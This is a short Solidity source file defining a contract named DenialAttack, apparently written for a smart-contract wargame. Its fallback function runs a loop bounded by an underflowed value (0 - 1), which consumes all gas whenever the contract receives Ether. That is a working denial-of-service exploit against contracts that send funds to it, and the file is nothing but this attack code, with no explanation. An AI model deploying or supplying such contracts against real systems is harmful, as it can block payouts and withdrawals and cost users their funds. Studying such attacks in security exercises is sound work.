// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttack {
    uint x = 0;

    fallback() external payable {
        uint p = 0;
        for (uint i = 0; i < (p - 1); i++) {
            x = x + 1;
        }
    }
}